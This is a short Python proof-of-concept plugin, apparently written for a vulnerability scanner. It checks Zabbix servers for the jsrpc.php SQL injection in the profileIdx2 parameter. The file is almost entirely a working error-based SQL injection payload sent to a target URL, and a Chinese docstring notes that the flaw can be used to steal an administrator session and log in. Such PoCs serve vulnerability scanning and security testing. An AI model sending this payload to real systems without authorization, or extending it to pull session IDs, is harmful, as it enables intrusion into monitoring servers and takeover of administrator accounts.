# Author:w8ay
# Name:测试DEMO
'''
name: zabbix jsrpc.php SQL注入
referer: http://seclists.org/fulldisclosure/2016/Aug/82
author: Lucifer
description: 文件jsrpc.php中,参数profileIdx2存在SQL注入。利用注入得到sessionid修改为管理员直接登录。
'''
import HackRequests


def poc(arg, **kwargs):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(1234),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20or%201=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    try:
        hh = hack.http(vulnurl, headers=headers)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in hh.text():
            result = {
                "name": "zabbix jsrpc.php SQL注入",  # 插件名称
                "content": "存在zabbix jsrpc.php SQL注入漏洞",  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": hh.log,
                "tag": "sql_inject"  # 漏洞标签
            }
            return result

    except:
        pass


if __name__ == "__main__":
    pass
